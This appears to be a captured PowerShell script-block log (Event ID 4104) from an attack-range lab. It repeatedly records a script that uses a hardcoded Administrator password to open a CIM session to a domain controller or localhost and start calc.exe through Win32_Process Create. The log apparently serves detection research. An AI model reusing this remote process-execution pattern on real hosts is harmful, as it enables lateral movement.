<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.713197600Z'/><EventRecordID>743699</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BC16-E22E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>4f2be20e-215c-4069-b115-dcb6f5e143f2</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.713178400Z'/><EventRecordID>743693</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BC16-E22E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>0bd5bb9d-853e-4368-84bb-74015995c35e</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.713160800Z'/><EventRecordID>743687</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BC16-E22E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>13205f20-1231-4aba-9781-3eadec3fdd49</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.538372000Z'/><EventRecordID>743669</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-7E56-DF2E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
 $RemoteComputer = "localhost"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>5ef41027-4973-4e23-afa2-855c1e967677</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:49:08.523788200Z'/><EventRecordID>743667</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-7D56-DF2E5457D901}'/><Execution ProcessID='6292' ThreadID='4456'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
 $RemoteComputer = "localhost"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>18410b56-5490-4029-be5e-f013d73a65f7</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.271099300Z'/><EventRecordID>743497</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-48B1-E02E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>15d38b1d-849c-43eb-a2a2-85f2676ba4b1</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.271081300Z'/><EventRecordID>743491</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-48B1-E02E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>b1e25456-09b9-4e57-9063-ba36db31b1e0</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.271069400Z'/><EventRecordID>743485</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-48B1-E02E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>6a4b0aa7-c82a-463d-b82c-7f7bab168b82</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.088952000Z'/><EventRecordID>743467</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0002-325C-E42E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
 $RemoteComputer = "localhost"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>8a275f67-a36a-401b-b2b0-b280ea086d77</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:48:53.078286000Z'/><EventRecordID>743465</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0002-315C-E42E5457D901}'/><Execution ProcessID='836' ThreadID='5188'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
 $RemoteComputer = "localhost"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>28c17cce-4080-4f0e-baa0-9d0d3e105b4d</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.891708200Z'/><EventRecordID>743128</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-2153-DF2E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>a7c01901-d258-4f7b-9df1-114206b8a18c</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.891688500Z'/><EventRecordID>743122</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-2153-DF2E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>4de3b840-cd7a-4c85-b155-50404f8c571b</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.891661900Z'/><EventRecordID>743116</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-2153-DF2E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>81b15fb2-b2f5-4be1-9a7a-273ad54a4fb3</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.585178900Z'/><EventRecordID>743098</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-62B0-E02E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
 $RemoteComputer = "localhost"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>288323c2-9629-47a5-afa1-0f66c33f4b18</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-22T20:47:00.569786400Z'/><EventRecordID>743096</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-61B0-E02E5457D901}'/><Execution ProcessID='3404' ThreadID='2656'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
 $RemoteComputer = "localhost"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>f119f71b-cbd0-44f0-a261-111bdfc9df7a</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T12:04:06.495805400Z'/><EventRecordID>740802</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0003-5E7B-DE2E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
 $RemoteComputer = "mswin-dc01.attackrange.local"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>a2c58e4e-3455-484a-aa3a-6bb3a26253d2</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:54:54.583245400Z'/><EventRecordID>740660</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-BEA0-E02E5457D901}'/><Execution ProcessID='4852' ThreadID='7072'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-2126937381-3842905909-1636914737-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'># Set the remote computer name and credentials
 $RemoteComputer = "mswin-dc01.attackrange.local"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
     Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
     Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession</Data><Data Name='ScriptBlockId'>b799d98a-bf2e-4200-9152-1e26234deadd</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.490263900Z'/><EventRecordID>740438</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-08A0-E02E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>51ac8f61-06b2-4cc9-9218-edae28af6b52</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.490236400Z'/><EventRecordID>740432</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-08A0-E02E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>5348ab7f-064a-4018-a13a-2d47b3f6173e</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.490218000Z'/><EventRecordID>740426</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0000-08A0-E02E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue</Data><Data Name='ScriptBlockId'>ef0a8a80-67aa-495e-aec6-fa8c5c0f828b</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.235688200Z'/><EventRecordID>740408</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0001-F9A2-DF2E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>{# Set the remote computer name and credentials
 $RemoteComputer = "mswin-dc01.attackrange.local"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
 $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

 # Check the result
 if ($Result.ReturnValue -eq 0) {
 Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
 } else {
 Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
 }

 # Clean up the CIM session
 Remove-CimSession -CimSession $CimSession}</Data><Data Name='ScriptBlockId'>9b0c3fb8-653f-4a2a-b7bd-8eb11b43e918</Data><Data Name='Path'></Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-PowerShell' Guid='{A0C1853B-5C40-4B15-8766-3CF1C58F985A}'/><EventID>4104</EventID><Version>1</Version><Level>5</Level><Task>2</Task><Opcode>15</Opcode><Keywords>0x0</Keywords><TimeCreated SystemTime='2023-03-21T11:53:18.225049300Z'/><EventRecordID>740406</EventRecordID><Correlation ActivityID='{2EDA0009-5754-0002-2699-E22E5457D901}'/><Execution ProcessID='6992' ThreadID='6740'/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>mswin-server.attackrange.local</Computer><Security UserID='S-1-5-21-3439621488-2671704973-1532913862-500'/></System><EventData><Data Name='MessageNumber'>1</Data><Data Name='MessageTotal'>1</Data><Data Name='ScriptBlockText'>&amp; {# Set the remote computer name and credentials
 $RemoteComputer = "mswin-dc01.attackrange.local"
 $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

 # Create a CIM session
 $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

 # Define the process you want to start
 $ProcessToStart = "calc.exe"

 # Invoke the Create method on the Win32_Process class to start the process
